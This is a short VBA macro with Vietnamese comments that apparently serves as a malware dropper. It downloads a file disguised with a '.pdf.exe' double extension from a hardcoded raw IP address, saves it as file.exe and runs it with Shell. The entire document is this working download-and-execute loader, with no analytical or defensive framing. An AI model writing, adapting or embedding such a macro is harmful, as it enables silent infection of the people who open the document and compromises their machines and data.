Sub DownloadAndRunFile()

    Dim url As String
    url = "http://103.182.16.8:8082/getb/admin/tqNnXJj.pdf.exe" 'Đường link tới file cần tải xuống
    
    Dim fileName As String
    fileName = "file.exe" 'Tên file sẽ được lưu trữ
    
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    http.Open "GET", url, False
    http.Send
    
    If http.Status <> 200 Then 'Kiểm tra nếu request bị lỗi
        MsgBox "File không tải được: " & http.Status & " " & http.statusText
        Exit Sub
    End If
    
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1 'Binary
    stream.Write http.responseBody
    stream.SaveToFile fileName, 2 'Overwrite
    
    stream.Close
    
    'Chạy file
    Shell fileName, vbNormalFocus
    
End Sub